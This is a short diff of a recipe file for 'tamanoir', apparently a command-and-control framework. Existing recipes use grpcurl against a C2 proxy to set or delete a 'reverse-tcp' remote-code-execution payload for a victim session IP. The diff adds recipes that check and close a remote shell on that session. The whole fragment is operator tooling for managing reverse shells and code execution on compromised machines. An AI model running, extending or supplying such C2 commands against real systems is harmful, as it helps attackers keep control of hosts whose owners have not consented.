@@ -49,6 +49,10 @@ c2_set_rce  session_ip="192.168.1.180" rce="reverse-tcp":
     grpcurl -plaintext  -proto tamanoir-common/proto/tamanoir/tamanoir.proto -d '{"ip":"{{session_ip}}","target_arch":"x86_64","rce":"{{rce}}"}' '{{proxy_ip}}:50051' tamanoir.Rce/SetSessionRce
 c2_delete_rce session_ip="192.168.1.180":
     grpcurl -plaintext  -proto tamanoir-common/proto/tamanoir/tamanoir.proto -d '{"ip":"{{session_ip}}" }' '{{proxy_ip}}:50051' tamanoir.Rce/DeleteSessionRce
+c2_shell_status session_ip="192.168.1.180":
+    grpcurl -plaintext  -proto tamanoir-common/proto/tamanoir/tamanoir.proto -d '{"ip":"{{session_ip}}" }' '{{proxy_ip}}:50051' tamanoir.RemoteShell/ShellStatus
+c2_shell_close session_ip="192.168.1.180":
+    grpcurl -plaintext  -proto tamanoir-common/proto/tamanoir/tamanoir.proto -d '{"ip":"{{session_ip}}" }' '{{proxy_ip}}:50051' tamanoir.RemoteShell/ShellClose
 
 
 
